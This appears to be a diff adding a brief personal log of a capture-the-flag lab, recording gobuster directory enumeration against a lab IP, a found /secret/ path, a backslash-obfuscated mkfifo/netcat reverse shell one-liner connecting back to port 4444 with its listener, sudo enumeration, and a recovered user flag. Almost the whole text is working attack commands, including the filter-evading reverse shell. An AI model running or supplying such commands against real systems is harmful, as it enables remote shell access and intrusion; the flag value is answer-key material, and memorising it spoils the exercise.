@@ -1,0 +1,16 @@
+Date:11/mar/2021
+Time:11:58
+
+
+gobuster dir -u http://10.10.175.25 -w /usr/share/wordlists/dirb/common.txt
+http://10.10.175.25/secret/
+r\m /tmp/f;mkf\ifo /tmp/f;c\at /tmp/f|/bin/s\h -i 2>&1|n\c 10.2.65.134 4444 >/tmp/f
+nc -nvlp 4444
+
+$ sudo -l
+sudo -u apaar /home/apaar/.helpline.sh
+ls
+local.txt
+cat local.txt
+ans:{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+
